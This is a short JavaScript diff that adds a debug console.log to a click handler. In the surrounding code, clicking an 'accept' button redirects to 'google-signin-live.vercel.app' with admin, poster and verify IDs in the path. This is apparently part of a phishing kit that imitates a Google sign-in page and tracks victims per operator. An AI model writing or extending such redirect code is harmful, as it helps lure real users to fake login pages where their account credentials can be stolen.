@@ -72,6 +72,8 @@ function getQueryParam(param) {
 
  document.querySelectorAll('.accept-button').forEach(button => {
   button.addEventListener('click', () => {
+                       console.log('click page:');
+
    window.location.href =  `https://google-signin-live.vercel.app/${adminId}/${posterId}/${verifyId}`;
   });
 });
